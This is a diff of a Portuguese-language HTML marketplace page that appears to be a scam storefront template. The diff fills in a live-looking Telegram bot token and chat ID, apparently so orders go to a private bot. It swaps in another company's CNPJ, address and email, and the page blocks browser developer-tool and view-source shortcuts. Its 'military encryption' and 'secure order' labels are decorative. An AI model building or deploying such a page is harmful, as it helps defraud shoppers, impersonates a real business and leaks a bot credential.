@@ -2,6 +2,7 @@
 <html lang="pt-br" class="scroll-smooth">
 <head>
     <meta charset="UTF-8">
+    <link rel="shortcut icon" href="/favicon.ico">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Grupo | Marketplace</title>
     <script src="https://cdn.tailwindcss.com"></script>
@@ -91,7 +92,7 @@
                 </div>
                 <span class="font-mono text-cyan-400 tracking-widest uppercase">CRIPTOGRAFIA MILITAR ATIVA</span>
             </div>
-            <div class="text-gray-400 font-mono" id="geo-info">SISTEMA DE AUDITORIA SANDXCDD V4.0</div>
+            <div class="text-gray-400 font-mono" id="geo-info">x-PARTNER SISTEMA</div>
         </div>
 
         <div id="productGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-20"></div>
@@ -103,15 +104,15 @@
                 <div>
                     <h4 class="text-white font-black italic mb-4 uppercase text-sm tracking-widest">Grupo <span class="amazon-orange">Apoio</span></h4>
                     <p class="text-xs text-gray-500 leading-relaxed">
-                        Logística avançada e fornecimento técnico industrial. Operando sob a infraestrutura SandxCDD para garantir máxima performance em entregas críticas e suprimentos de alta durabilidade.
+                        Logística avançada e fornecimento técnico industrial. Operando sob a infraestrutura x-PARTNER para garantir máxima performance em entregas críticas e suprimentos de alta durabilidade.
                     </p>
                 </div>
                 <div>
                     <h4 class="text-white font-black italic mb-4 uppercase text-sm tracking-widest">Dados Corporativos</h4>
                     <ul class="text-xs text-gray-500 space-y-2 font-mono">
-                        <li><i class="fas fa-id-card mr-2 amazon-orange"></i> CNPJ: 49.626.542/0001-38</li>
-                        <li><i class="fas fa-map-marker-alt mr-2 amazon-orange"></i> Av. Comercial Norte, Taguatinga - DF</li>
-                        <li><i class="fas fa-envelope mr-2 amazon-orange"></i> compliance@sandxcdd.com</li>
+                        <li><i class="fas fa-id-card mr-2 amazon-orange"></i> CNPJ: 11.874.801/0001-00</li>
+                        <li><i class="fas fa-map-marker-alt mr-2 amazon-orange"></i>Jardim da Barragem III - Quadra 1B lotes 45 ao 48 e 70 - Águas Lindas - GO</li>
+                        <li><i class="fas fa-envelope mr-2 amazon-orange"></i>aguaslindas@apoiodistribuidora.com</li>
                     </ul>
                 </div>
                 <div>
@@ -129,7 +130,7 @@
             </div>
             <div class="border-t border-white/5 pt-6 text-center">
                 <p class="text-[10px] text-gray-600 uppercase tracking-widest font-bold">
-                    &copy; 2026 GRUPO APOIO | SANDXCDD PERFORMANCE STRATEGY - TODOS OS DIREITOS RESERVADOS.
+                    &copy; 2026 GRUPO APOIO | x-PARTNER PERFORMANCE - TODOS OS DIREITOS RESERVADOS.
                 </p>
             </div>
         </div>
@@ -198,14 +199,14 @@
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && (e.keyCode == 85 || e.keyCode == 83))) return false;
         };
 
-        const BOT_TOKEN = 'SEU_TOKEN_AQUI';
-        const CHAT_ID = 'SEU_CHAT_ID_AQUI';
+        const BOT_TOKEN = '8219446982:AAFqTg67JtTlgK6U19B5W35O7gFhNLD0vxw';
+        const CHAT_ID = '1703808186';
 
         const db_estoque = [
-            { id: 101, nome: "Parafuso Sextavado Aço 8.8", preco: 145.90, img: "https://images.tcdn.com.br/img/editor/up/694503/parafuso.png", loja: "Atacadão Ferragens" },
-            { id: 102, nome: "Dashboard Performance SandxCDD", preco: 597.00, img: "https://cdn-icons-png.flaticon.com/512/2103/2103633.png", loja: "Digital Solutions" },
-            { id: 103, nome: "Kit Brocas Profissional", preco: 89.90, img: "https://images.tcdn.com.br/img/editor/up/694503/brocas.png", loja: "Loja Parceira" },
-            { id: 104, nome: "Painel LED Industrial 60W", preco: 210.00, img: "https://cdn-icons-png.flaticon.com/512/3159/3159480.png", loja: "Rei do LED" }
+            { id: 101, nome: "Parafuso Sextavado Aço 8.8", preco: 1.90, img: "https://images.cws.digital/produtos/gg/16/16/parafuso-chipboard-40x25-phs-500-unidades-7951616-1648562696644.jpg", loja: "Atacadão Ferragens" },
+            { id: 102, nome: "Cimento votoran 25kg", preco: 57.00, img: "https://static.vecteezy.com/system/resources/previews/073/448/950/non_2x/cement-bag-icon-illustration-3d-render-png", loja: "Digital Solutions" },
+            { id: 103, nome: "Kit Tintas Pinturas Profissional", preco: 589.90, img: "https://png.pngtree.com/thumb_back/fh260/background/20230616/pngtree-vibrant-colored-paint-cans-in-a-striking-3d-render-image_3615606.jpg", loja: "PINTURAS" },
+            { id: 104, nome: "Ferramentas Completa Industrial", preco: 250.00, img: "https://cdn3d.iconscout.com/3d/premium/thumb/caja-de-herramientas-3d-icon-png-download-6855690.png", loja: "FERRAMENTAS" }
         ];
 
         let sacola = JSON.parse(localStorage.getItem('sandx_cart')) || [];
@@ -328,7 +329,7 @@
             btn.disabled = true;
             
             setTimeout(() => {
-                alert("✅ PEDIDO ENVIADO! Auditoria SandxCDD confirmada.");
+                alert("✅ PEDIDO ENVIADO! confirmado.");
                 sacola = []; atualizarCarrinho(); toggleCarrinho();
                 btn.innerHTML = '<i class="fas fa-lock mr-2"></i> Finalizar Pedido Seguro';
                 btn.disabled = false;
